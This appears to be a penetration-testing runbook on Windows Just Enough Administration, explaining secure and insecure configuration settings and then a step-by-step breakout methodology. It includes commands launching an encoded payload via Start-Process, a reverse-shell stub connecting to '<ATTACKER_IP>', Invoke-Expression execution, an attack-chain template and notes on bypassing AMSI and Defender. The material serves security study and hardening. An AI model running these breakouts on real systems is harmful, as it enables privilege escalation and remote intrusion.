
# Just Enough Administration (JEA) - Runbook

## Quick Reference

|Item|Value|
|---|---|
|Introduced|Windows Server 2016|
|Purpose|Limit admin access to specific PowerShell commands|
|Session config file|`.pssc`|
|Role capabilities file|`.psrc`|
|Default virtual account group|Local Administrators|
|Dangerous session type|`Default` (FullLanguageMode)|
|Safe session type|`RestrictedRemoteServer` (NoLanguageMode)|

## What is JEA?

**Problem:** You need to give a helpdesk user the ability to restart services on a server. Traditional approach: make them a local admin. Risk: they now have full control of the server.

**JEA Solution:** Create a restricted PowerShell session where they can ONLY run `Restart-Service` and nothing else. They connect via PowerShell remoting, run their allowed commands, and disconnect. No full admin access needed.

**Key Point:** The user runs commands in an admin context (via a virtual account), but can only execute pre-approved commands.

## How JEA Fits in the Security Stack

|Technology|Layer|What It Does|
|---|---|---|
|Defender|Endpoint|Blocks known malware signatures|
|AMSI|Runtime|Scans scripts for malicious content|
|AppLocker|Execution|Controls which executables can run|
|CLM|PowerShell|Restricts PowerShell language features|
|**JEA**|PowerShell|Restricts which cmdlets a user can run|

**JEA is the most granular** - it controls exactly which commands and parameters are allowed.

## JEA Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    JEA Session                          │
├─────────────────────────────────────────────────────────┤
│  User connects via PowerShell Remoting (WinRM)          │
│                         ↓                               │
│  Session Configuration File (.pssc)                     │
│  - Who can connect (RoleDefinitions)                    │
│  - Virtual account settings                             │
│  - Session type (language mode)                         │
│                         ↓                               │
│  Role Capabilities File (.psrc)                         │
│  - Allowed cmdlets (VisibleCmdlets)                     │
│  - Allowed providers (VisibleProviders)                 │
│  - Parameter restrictions                               │
│                         ↓                               │
│  Virtual Account (temporary local admin)                │
│  - Created on session start                             │
│  - Destroyed on session end                             │
│  - Member of local Administrators                       │
└─────────────────────────────────────────────────────────┘
```

## Two Key Configuration Files

### 1. Session Configuration File (.pssc)

Created with `New-PSSessionConfigurationFile`. Defines WHO can connect and HOW.

**Critical Settings:**

|Setting|Secure Value|Insecure Value|Why It Matters|
|---|---|---|---|
|`SessionType`|`RestrictedRemoteServer`|`Default`|Default = FullLanguageMode = all PowerShell features available|
|`RunAsVirtualAccount`|`$true`|`$false` or missing|Virtual accounts are temporary and auditable|
|`TranscriptDirectory`|Set to a path|Not set|Logging for accountability|
|`RoleDefinitions`|Specific AD groups|Too broad|Controls who can access JEA|

**Example (insecure):**

```powershell
@{
    SessionType = 'Default'  # DANGEROUS: FullLanguageMode
    RunAsVirtualAccount = $true
    RoleDefinitions = @{ 'CORP\HelpDesk' = @{ RoleCapabilities = 'HelpDeskSupport' } }
}
```

### 2. Role Capabilities File (.psrc)

Created with `New-PSRoleCapabilityFile`. Defines WHAT commands are allowed.

**Critical Settings:**

|Setting|Purpose|Misconfiguration Risk|
|---|---|---|
|`VisibleCmdlets`|Which cmdlets user can run|Overly permissive = breakout|
|`VisibleProviders`|Which providers are available|FileSystem provider = full disk access|
|`VisibleFunctions`|Which functions are available|Custom functions may be abusable|

**Example (insecure):**

```powershell
@{
    # No parameter restrictions = can start ANY process
    VisibleCmdlets = 'Start-Process'
}
```

## Why JEA is Exploitable

**The Paradox:** JEA sessions run as a virtual account in the local Administrators group. If you can break out of the restricted command set, you have admin access.

**Common Misconfigurations:**

|Misconfiguration|Exploitation|
|---|---|
|`SessionType = 'Default'`|Full PowerShell language available|
|`VisibleCmdlets = 'Start-Process'` (no restrictions)|Start any process including reverse shells|
|`VisibleProviders = 'FileSystem'`|Read/write anywhere on disk|
|`VisibleCmdlets = 'Invoke-Command'`|Execute arbitrary code|
|`VisibleCmdlets = 'Invoke-Expression'`|Execute arbitrary code|

## Exploitation Methodology

### Step 1: Identify JEA Endpoints

From a compromised user session:

```powershell
Get-PSSessionConfiguration
```

Look for custom configurations (not just default Microsoft ones).

### Step 2: Connect to JEA Session

```powershell
Enter-PSSession -ComputerName <TARGET> -ConfigurationName <JEA_CONFIG_NAME>
```

Or:

```powershell
$session = New-PSSession -ComputerName <TARGET> -ConfigurationName <JEA_CONFIG_NAME>
Enter-PSSession $session
```

### Step 3: Enumerate Available Commands

Once in the JEA session:

```powershell
Get-Command
```

This shows ONLY the commands you're allowed to run.

### Step 4: Check Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```

|Mode|Meaning|
|---|---|
|`FullLanguage`|All PowerShell features - easy breakout|
|`ConstrainedLanguage`|Limited but some features available|
|`NoLanguage`|Most restrictive - cmdlets only|

### Step 5: Check Available Providers

```powershell
Get-PSProvider
```

If `FileSystem` is available, you can navigate the entire disk.

### Step 6: Breakout Techniques

**If `Start-Process` is available (no parameter restrictions):**

```powershell
Start-Process cmd.exe
Start-Process powershell.exe -ArgumentList "-e <BASE64_PAYLOAD>"
```

**If `Invoke-Command` is available:**

```powershell
Invoke-Command -ScriptBlock { whoami /all }
```

**If `Invoke-Expression` is available:**

```powershell
Invoke-Expression "cmd /c whoami"
```

**If `FileSystem` provider is available:**

```powershell
cd C:\Users\Administrator\Desktop
Get-ChildItem
Get-Content flag.txt
```

**If in FullLanguageMode:**

```powershell
# Full PowerShell available - do anything
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>", 443)
# ... reverse shell code
```

## Enumeration Checklist

When you land in a JEA session, run these:

```powershell
# What can I run?
Get-Command
# What language mode?
$ExecutionContext.SessionState.LanguageMode
# What providers?
Get-PSProvider
# Who am I? (should be virtual account)
whoami
# What groups? (should include Administrators)
whoami /groups
```

## Full Attack Chain Template

```powershell
# 1. Find JEA endpoints
Get-PSSessionConfiguration
# 2. Connect to JEA session
Enter-PSSession -ComputerName <TARGET> -ConfigurationName <JEA_CONFIG>
# 3. Enumerate
Get-Command
$ExecutionContext.SessionState.LanguageMode
Get-PSProvider
# 4. Breakout (depends on what's available)
Start-Process powershell.exe  # if Start-Process allowed
# or
Invoke-Expression "cmd /c whoami"  # if Invoke-Expression allowed
# or
cd C:\; Get-ChildItem -Recurse  # if FileSystem provider allowed
```

## Key Takeaways

1. **JEA runs as local admin** - breakout = instant privilege escalation
2. **SessionType = Default is dangerous** - gives FullLanguageMode
3. **Unrestricted cmdlets are dangerous** - especially `Start-Process`, `Invoke-Command`, `Invoke-Expression`
4. **FileSystem provider = full disk access** - even if commands are limited
5. **Always enumerate first** - `Get-Command` shows your attack surface
6. **Virtual accounts are temporary** - but still have admin rights during the session

## Comparison: JEA vs Other Restrictions

| Feature   | Bypass Difficulty | What to Look For                         |
| --------- | ----------------- | ---------------------------------------- |
| JEA       | Medium            | Misconfigured cmdlets, wrong SessionType |
| CLM       | Medium-Hard       | .NET methods, COM objects                |
| AppLocker | Medium            | Trusted paths, LOLBAS                    |
| AMSI      | Easy-Medium       | Obfuscation, reflection, patching        |
| Defender  | Varies            | Custom payloads, obfuscation             |